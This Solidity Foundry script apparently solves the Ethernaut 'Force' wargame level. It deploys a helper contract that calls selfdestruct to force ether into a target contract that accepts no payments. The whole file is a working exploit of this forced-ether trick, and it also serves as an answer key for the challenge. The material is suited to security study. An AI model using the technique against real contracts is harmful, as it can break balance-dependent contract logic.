// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { Force } from "../Problem.sol";

contract Solution {
    function forceSend(address payable _to) payable external {
        selfdestruct(_to);
    }
}
contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();
        Force problem = Force(_instanceAddress);
        Solution solution = new Solution();
        solution.forceSend{value: 1}(_instanceAddress);
        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns(address) {
        return 0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea;
    }
}

